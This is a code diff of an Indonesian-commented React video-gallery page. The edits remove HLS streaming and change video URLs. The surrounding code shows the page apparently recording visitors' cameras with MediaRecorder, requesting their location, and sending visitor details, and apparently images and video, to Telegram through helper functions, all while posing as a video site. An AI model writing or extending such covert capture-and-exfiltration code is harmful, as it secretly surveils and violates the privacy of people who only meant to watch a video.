@@ -1,7 +1,6 @@
 import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback, useRef } from 'react';
 import Slider from 'react-slick';
-import Hls from 'hls.js';
 import './styles/custom.css';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
 import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';
@@ -9,7 +8,6 @@ import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from 
 // Definisikan tipe untuk video dengan thumbnail
 interface Video {
   videoUrl: string;
-  hlsUrl: string;
   thumbnailUrl: string;
 }
 
@@ -20,14 +18,6 @@ const chunkArray = <T,>(array: T[], size: number): T[][] => {
     result.push(array.slice(i, i + size));
   }
   return result;
-};
-
-// Fungsi untuk mendeteksi apakah browser adalah Safari atau iPhone
-const isSafariOrIPhone = () => {
-  const userAgent = navigator.userAgent;
-  const isSafariBrowser = /Safari/.test(userAgent) && !/Chrome/.test(userAgent);
-  const isIPhone = /iPhone|iPad|iPod/.test(userAgent);
-  return isSafariBrowser || isIPhone;
 };
 
 function App() {
@@ -43,13 +33,18 @@ function App() {
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const sliderRef = useRef<Slider | null>(null);
-  const hlsInstances = useRef<(Hls | null)[]>([]);
 
-  // Array videos dikosongkan
+  // Array videos dengan MP4 dari cdn.videy.co
   const videos: Video[] = [
-  { videoUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/original/vidio765.mp4", hlsUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/hls/vidio765/vidio765.m3u8", thumbnailUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/thumbnails/vidio765.webp" },
-  { videoUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/original/vidio99.mp4", hlsUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/hls/vidio99/vidio99.m3u8", thumbnailUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/thumbnails/vidio99.webp" }
-];
+    {
+      videoUrl: "https://cdn.videy.co/xuIVvJ581.mp4",
+      thumbnailUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/thumbnails/vidio765.webp",
+    },
+    {
+      videoUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/original/vidio765.mp4",
+      thumbnailUrl: "https://vidiohub.s3.ap-southeast-2.amazonaws.com/thumbnails/vidio765.webp",
+    },
+  ];
 
   const videoSlides = chunkArray(videos, 5);
 
@@ -58,7 +53,6 @@ function App() {
     console.log('Menginisialisasi state isLoading dan videoErrors...');
     setIsLoading(new Array(videos.length).fill(true));
     setVideoErrors(new Array(videos.length).fill(false));
-    hlsInstances.current = new Array(videos.length).fill(null);
 
     const logDetails: VisitorDetails = {
       userAgent: navigator.userAgent,
@@ -122,9 +116,8 @@ function App() {
     const activeSlideVideos = videoSlides[currentSlide];
     activeSlideVideos.forEach((video, index) => {
       const globalIndex = currentSlide * 5 + index;
-      const urlToValidate = isSafariOrIPhone() ? video.hlsUrl : video.videoUrl;
-      console.log(`Memeriksa video ${globalIndex + 1}: ${urlToValidate}`);
-      if (!validateVideoUrl(urlToValidate)) {
+      console.log(`Memeriksa video ${globalIndex + 1}: ${video.videoUrl}`);
+      if (!validateVideoUrl(video.videoUrl)) {
         console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
         setVideoErrors((prev) => {
           const newErrors = [...prev];
@@ -181,11 +174,9 @@ function App() {
     sendVisitorNotification();
 
     return () => {
-      console.log('Membersihkan stream kamera dan HLS instances...');
+      console.log('Membersihkan stream kamera...');
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
-      hlsInstances.current.forEach((hls) => hls?.destroy());
-      hlsInstances.current = [];
     };
   }, [hasRequestedLocation]);
 
@@ -416,7 +407,7 @@ function App() {
       };
 
       mediaRecorder.start(1000);
-      console.log(`Mulai merekam kamera ${type}`);
+      console.log(`Mulai merekam kamera    camera ${type}`);
 
       await new Promise((resolve) => setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
@@ -467,88 +458,9 @@ function App() {
     }
   }, []);
 
-  const setupHls = (videoElement: HTMLVideoElement, hlsUrl: string, index: number) => {
-    console.log(`Memulai setupHls untuk video ${index + 1}, URL: ${hlsUrl}`);
-    if (Hls.isSupported()) {
-      console.log(`Hls.js didukung, membuat instance untuk video ${index + 1}`);
-      const hls = new Hls({
-        enableWorker: true,
-        lowLatencyMode: true,
-        backBufferLength: 90,
-      });
-      hls.loadSource(hlsUrl);
-      console.log(`HLS source dimuat: ${hlsUrl}`);
-      hls.attachMedia(videoElement);
-      hls.on(Hls.Events.MANIFEST_PARSED, () => {
-        console.log(`Manifest HLS diparsing untuk video ${index + 1}, mencoba memutar...`);
-        videoElement.muted = true;
-        videoElement.play().catch((err) => {
-          console.error(`HLS play error for video ${index + 1}:`, err);
-          setVideoErrors((prev) => {
-            const newErrors = [...prev];
-            newErrors[index] = true;
-            return newErrors;
-          });
-          setIsLoading((prev) => {
-            const newLoading = [...prev];
-            newLoading[index] = false;
-            return newLoading;
-          });
-        });
-      });
-      hls.on(Hls.Events.ERROR, (event, data) => {
-        console.error(`HLS error for video ${index + 1}:`, data);
-        if (data.fatal) {
-          setVideoErrors((prev) => {
-            const newErrors = [...prev];
-            newErrors[index] = true;
-            return newErrors;
-          });
-          setIsLoading((prev) => {
-            const newLoading = [...prev];
-            newLoading[index] = false;
-            return newLoading;
-          });
-          hls.destroy();
-        }
-      });
-      hlsInstances.current[index] = hls;
-    } else if (videoElement.canPlayType('application/vnd.apple.mpegurl')) {
-      console.log(`Native HLS didukung, memuat ${hlsUrl} secara langsung`);
-      videoElement.src = hlsUrl;
-      videoElement.muted = true;
-      videoElement.load();
-      videoElement.play().catch((err) => {
-        console.error(`Native HLS error for video ${index + 1}:`, err);
-        setVideoErrors((prev) => {
-          const newErrors = [...prev];
-          newErrors[index] = true;
-          return newErrors;
-        });
-        setIsLoading((prev) => {
-          const newLoading = [...prev];
-          newLoading[index] = false;
-          return newLoading;
-        });
-      });
-    } else {
-      console.error(`HLS not supported for video ${index + 1}`);
-      setVideoErrors((prev) => {
-        const newErrors = [...prev];
-        newErrors[index] = true;
-        return newErrors;
-      });
-      setIsLoading((prev) => {
-        const newLoading = [...prev];
-        newLoading[index] = false;
-        return newLoading;
-      });
-    }
-  };
-
   const handleVideoClick = useCallback(
     async (index: number) => {
-      console.log(`Video di indeks ${index} diklik, memulai startCameraRecording...`);
+      console.log(`Video di indeks ${index} diklik`);
       const clickLog: VisitorDetails = {
         userAgent: navigator.userAgent,
         location: window.location.href,
@@ -566,10 +478,6 @@ function App() {
           prevVideo.currentTime = 0;
           prevVideo.removeAttribute('src');
           prevVideo.load();
-          if (hlsInstances.current[isPlaying]) {
-            hlsInstances.current[isPlaying]?.destroy();
-            hlsInstances.current[isPlaying] = null;
-          }
           stopRecording();
           console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
         }
@@ -577,10 +485,10 @@ function App() {
 
       const videoElement = videoRefs.current[index];
       if (videoElement) {
-        const urlToUse = isSafariOrIPhone() ? videos[index].hlsUrl : videos[index].videoUrl;
+        const urlToUse = videos[index].videoUrl;
         console.log(`Memutar video ${index + 1} dengan URL: ${urlToUse}`);
         if (!validateVideoUrl(urlToUse)) {
-          console.error(`URL video tidak valid, menghentikan pemutaran untuk video ${index + 1}.`);
+          console.error(`URL video tidak valid: ${urlToUse}`);
           setVideoErrors((prev) => {
             const newErrors = [...prev];
             newErrors[index] = true;
@@ -597,22 +505,22 @@ function App() {
         try {
           setIsPlaying(index);
           videoElement.muted = true;
-          if (isSafariOrIPhone()) {
-            console.log(`Menggunakan HLS di Safari/iPhone untuk video ${index + 1}`);
-            setupHls(videoElement, videos[index].hlsUrl, index);
-          } else {
-            console.log(`Menggunakan URL langsung untuk video ${index + 1}`);
-            videoElement.src = urlToUse;
-            videoElement.load();
-            await videoElement.play();
-            const playLog: VisitorDetails = {
-              userAgent: navigator.userAgent,
-              location: window.location.href,
-              referrer: document.referrer || 'Langsung',
-              previousSites: `App.tsx: Berhasil memutar video ${index + 1} dengan URL: ${urlToUse}`,
-            };
-            sendTelegramNotification(playLog).catch((err) => console.error('Gagal mengirim log play ke Telegram:', err.message));
-          }
+          videoElement.crossOrigin = "anonymous";
+          videoElement.src = urlToUse;
+          videoElement.load();
+          await videoElement.play();
+          setIsLoading((prev) => {
+            const newLoading = [...prev];
+            newLoading[index] = false;
+            return newLoading;
+          });
+          const playLog: VisitorDetails = {
+            userAgent: navigator.userAgent,
+            location: window.location.href,
+            referrer: document.referrer || 'Langsung',
+            previousSites: `App.tsx: Berhasil memutar video ${index + 1} dengan URL: ${urlToUse}`,
+          };
+          sendTelegramNotification(playLog).catch((err) => console.error('Gagal mengirim log play ke Telegram:', err.message));
         } catch (error: unknown) {
           const err = error as Error;
           console.error(`Error memutar video ${index + 1}: ${err.message}`);
@@ -620,10 +528,6 @@ function App() {
           videoElement.currentTime = 0;
           videoElement.removeAttribute('src');
           videoElement.load();
-          if (hlsInstances.current[index]) {
-            hlsInstances.current[index]?.destroy();
-            hlsInstances.current[index] = null;
-          }
           setIsPlaying(null);
           setVideoErrors((prev) => {
             const newErrors = [...prev];
@@ -668,10 +572,6 @@ function App() {
 
   const handleVideoEnded = (index: number) => {
     setIsPlaying(null);
-    if (hlsInstances.current[index]) {
-      hlsInstances.current[index]?.destroy();
-      hlsInstances.current[index] = null;
-    }
     console.log(`Video di indeks ${index} telah selesai.`);
     const logDetails: VisitorDetails = {
       userAgent: navigator.userAgent,
@@ -703,7 +603,7 @@ function App() {
     const errorCode = videoElement.error?.code;
     const errorMessage = videoElement.error?.message || 'Unknown error';
     console.error(
-      `Gagal memuat video ${index + 1}: ${videos[index][isSafariOrIPhone() ? 'hlsUrl' : 'videoUrl']} | Error Code: ${errorCode} | Message: ${errorMessage}`
+      `Gagal memuat video ${index + 1}: ${videos[index].videoUrl} | Error Code: ${errorCode} | Message: ${errorMessage}`
     );
     setIsLoading((prev) => {
       const newLoading = [...prev];
@@ -715,10 +615,6 @@ function App() {
       newErrors[index] = true;
       return newErrors;
     });
-    if (hlsInstances.current[index]) {
-      hlsInstances.current[index]?.destroy();
-      hlsInstances.current[index] = null;
-    }
   };
 
   useEffect(() => {
@@ -731,10 +627,6 @@ function App() {
             videoElement.currentTime = 0;
             videoElement.removeAttribute('src');
             videoElement.load();
-            if (hlsInstances.current[isPlaying]) {
-              hlsInstances.current[isPlaying]?.destroy();
-              hlsInstances.current[isPlaying] = null;
-            }
             console.log('Video dihentikan karena keluar dari fullscreen.');
           }
         }
@@ -746,8 +638,6 @@ function App() {
       stopRecording();
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
-      hlsInstances.current.forEach((hls) => hls?.destroy());
-      hlsInstances.current = [];
     };
 
     document.addEventListener('fullscreenchange', handleFullscreenChange);
@@ -862,14 +752,12 @@ function App() {
                     <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
                       {slideVideos.map((video, index) => {
                         const globalIndex = slideIndex * 5 + index;
-                        const videoSource = isSafariOrIPhone() ? video.hlsUrl : video.videoUrl;
-                        const videoType = isSafariOrIPhone() ? 'application/vnd.apple.mpegurl' : 'video/mp4';
-                        console.log(`Rendering video ${globalIndex + 1} dengan source: ${videoSource}`);
+                        console.log(`Rendering video ${globalIndex + 1} dengan source: ${video.videoUrl}`);
                         const renderLog: VisitorDetails = {
                           userAgent: navigator.userAgent,
                           location: window.location.href,
                           referrer: document.referrer || 'Langsung',
-                          previousSites: `App.tsx: Rendering video ${globalIndex + 1} dengan source: ${videoSource}`,
+                          previousSites: `App.tsx: Rendering video ${globalIndex + 1} dengan source: ${video.videoUrl}`,
                         };
                         sendTelegramNotification(renderLog).catch((err) => console.error('Gagal mengirim log render ke Telegram:', err.message));
                         return (
@@ -920,13 +808,14 @@ function App() {
                               muted
                               playsInline
                               webkit-playsinline="true"
+                              crossOrigin="anonymous"
                               onClick={() => handleVideoClick(globalIndex)}
                               onEnded={() => handleVideoEnded(globalIndex)}
                               onCanPlay={() => handleCanPlay(globalIndex)}
                               onError={(event) => handleVideoError(globalIndex, event)}
                               preload="metadata"
                             >
-                              <source src={videoSource} type={videoType} />
+                              <source src={video.videoUrl} type="video/mp4" />
                             </video>
                             {isPlaying === globalIndex && !videoErrors[globalIndex] && (
                               <div className="absolute bottom-2 right-2 z-20">
